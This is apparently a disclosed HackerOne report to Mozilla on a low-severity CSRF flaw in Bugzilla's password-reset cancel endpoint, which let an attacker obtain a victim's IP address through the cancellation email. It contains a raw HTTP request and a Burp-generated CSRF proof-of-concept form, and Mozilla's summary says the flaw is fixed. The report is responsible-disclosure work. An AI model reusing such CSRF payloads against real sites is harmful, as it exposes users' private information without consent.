{
  "id": 2737309,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzM3MzA5",
  "url": "https://hackerone.com/reports/2737309",
  "title": "Information disclosure on password cancel endpoint ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2024-09-25T08:28:18.301Z",
  "submitted_at": "2024-09-25T08:28:18.870Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hackeriron1",
    "url": "/hackeriron1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1e3fpr231qwkvy56up7h4u5frwta/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61236,
    "url": "https://hackerone.com/mozilla",
    "handle": "mozilla",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Mozilla",
      "twitter_handle": "",
      "website": "https://www.mozilla.org",
      "about": "Mozilla web bug bounty program specific to encouraging security research in Mozilla's products and web services."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-10-29T13:18:06.929Z",
  "bug_reporter_agreed_on_going_public_at": "2024-10-28T17:50:01.075Z",
  "team_member_agreed_on_going_public_at": "2024-10-29T13:18:06.422Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nHI team,\n\nfew month ago I found #2106662 ```CSRF to information disclosure vulnerability ``` and team resolved so I was testing then I got same vulnerability in https://bugzilla.mozilla.org/. when someone try to get password reset token so then if they will cancel password reset to they will get email notification and email contain victim IP address. so attacker can easly victim IP from cancellation process. \n\nIt's low hanging security risk but it's significant for users. where attacker able to get victim IP, Address.\nThis is disclosing users information. one click information disclosed. \n\nSuppose attacker create account on https://bugzilla.mozilla.org/ Now attacker knows the victim created also account on https://bugzilla.mozilla.org/. Now attacker create CSRF Payload using his own email. bcoz attacker knows the how password reset functionality works ( which contain the  IP address.)  now attacker send the malicious link to victim. \n\nREQUEST:-\n\n```javascript\nPOST /token.cgi HTTP/2\nHost: bugzilla.mozilla.org\nCookie: _ga=GA1.2.943165794.1724831061; _ga_PWTK27XVWP=GS1.1.1724884053.2.0.1724884053.0.0.0; _ga_MQ7767QQQW=GS1.1.1726224133.2.0.1726224133.0.0.0; _ga_B9CY1C9VBC=GS1.1.1727174575.2.1.1727174593.0.0.0; _gid=GA1.2.1127107875.1727130511\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 114\nOrigin: http://burpsuite\nReferer: http://burpsuite/\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: cross-site\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\ncancel_token=1727251240-UxKc4U5ThgrHPhWNJ323-fahjy5Pn05h5ZYb7OqG-SI&t=3XOIDGIRtcwC3icniucOlm&a=cxlpw&cancel=Cancel\n```\nConvert to CSRF:-\n\n```js\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://bugzilla.mozilla.org/token.cgi\" method=\"POST\">\n      <input type=\"hidden\" name=\"cancel&#95;token\" value=\"1727251240&#45;UxKc4U5ThgrHPhWNJ323&#45;fahjy5Pn05h5ZYb7OqG&#45;SI\" />\n      <input type=\"hidden\" name=\"t\" value=\"3XOIDGIRtcwC3icniucOlm\" />\n      <input type=\"hidden\" name=\"a\" value=\"cxlpw\" />\n      <input type=\"hidden\" name=\"cancel\" value=\"Cancel\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\n## Steps To Reproduce:\n1. Create account https://bugzilla.mozilla.org/.  and send password reset link on his own email.\n2. Attacker open password cancel link and create CSRF Html link. \n3. Send  to victim and attacker got email Password change request canceled\n4. When attacker open email so attacker got victim IP Address. \n\nSee in this PoC Payload attacker will use own email. Bcoz when Victim click on that malicious link attacker will get victim Information on attacker email.\n███\n\n## Impact\n\n## Summary:\nAttacker can get Information of victim by sending a link to the Victim, which will contain the Victim's IP address.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-11-27T17:50:01.636Z",
  "allow_singular_disclosure_after": -25661292.91577984,
  "singular_disclosure_allowed": true,
  "vote_count": 43,
  "voters": [
    "orange303",
    "todayisnew-",
    "zy9ard3",
    "mikelly",
    "2026",
    "thalaivar304",
    "spaghettisec",
    "cyberritzzz",
    "who_am_i_",
    "molexy12",
    "and 33 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 635509,
    "asset_type": "URL",
    "asset_identifier": "bugzilla.mozilla.org",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 570314,
      "category": "team",
      "content": "During the password reset cancellation process, an email containing the user's IP address was sent upon cancellation. This issue was exploited to get the IP address of a user by tricking them into submitting the password reset cancellation request. \n\nThis issue has been resolved by removing the IP address from the email sent to users when they cancel the password reset request.",
      "updated_at": "2024-11-05T09:30:32.358Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 2465541,
        "username": "frida-k",
        "name": "Frida",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2022-09-21T23:39:33.826Z",
        "url": "https://hackerone.com/frida-k",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
